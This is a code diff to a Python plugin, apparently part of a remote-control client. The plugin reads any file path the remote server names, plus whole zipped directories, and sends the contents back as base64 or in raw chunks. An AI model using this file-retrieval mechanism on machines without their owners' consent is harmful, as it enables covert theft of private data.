@@ -1,7 +1,8 @@
 import os
-from os.path import expanduser
+from os.path import expanduser, getsize
 from base64 import b64encode
 import zipfile, zlib
+from connection import TerminatingClient, HeaderClient
 
 
 def zipdir(path, ziph):
@@ -19,22 +20,57 @@ def zipdir(path, ziph):
             ziph.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(path, '..')))
 
 
-def send_file(filepath, client):
+def send_file(filepath, client, b64=False):
     """
     Send the contents of a file to the server.
+    If b64 is set to True the entire file will
+    be read into memory and encoded as base64
+    before being sent to the server.  If it
+    is left as the default, False, the file
+    will be sent as raw bytes in chunks.
 
     :param filepath:
     :param client:
+    :param b64:
     :return:
     """
 
     # Open the given filepath.
+
+    # Get the total size of the file in bytes.
+    total_bytes = getsize(expanduser(filepath))
+    # Send the total bytes over to the server if using a HeaderClient.
+    if client.connection_type == HeaderClient:
+        client.send_data(str(total_bytes))
+    read_size = 1024
+
+    # Open the file and send the data.
     with open(expanduser(filepath), 'rb') as f:
-        # Encode the file contents.
-        data = b64encode(f.read())
-        # Send the data over to the server.
-        client.send_data(data, encode=False, chunks=True, echo=False)
-        f.close()
+        # Encode to base64 and send the data, then return.
+        if b64:
+            data = b64encode(f.read())
+            if client.connection_type == TerminatingClient:
+                client.send_data(data, encode=False, chunks=True, echo=False)
+            else:
+                client.send_data(data, encode=False, echo=False)
+            client.terminate()
+            f.close()
+            return
+        # Read the file in chunks based on the read_size, and
+        # send those chunks to the server.
+        while True:
+            data = f.read(read_size)
+            # Send the data over to the server.
+            client.send_data(data, encode=False, echo=False)
+            # When reading a file by bytes, the `data` returned
+            # by `f.read(read_size)` will be less than the `size`
+            # specified if the EOF is reached.  Knowing that,
+            # we can check the size of the `data` to see if it
+            # is less than the `read_size`, and stop reading
+            # once we hit the EOF.
+            if len(data) < read_size:
+                f.close()
+                break
 
 
 class Plugin(object):
@@ -82,7 +118,10 @@ class Plugin(object):
         try:
             filepath = data.strip()
             # Try to send the file.
-            send_file(filepath, client)
+            if client.connection_type == TerminatingClient:
+                send_file(filepath, client, b64=True)
+            else:
+                send_file(filepath, client)
 
         # Send the error back to the server if the file is not found.
         except FileNotFoundError as err_msg:
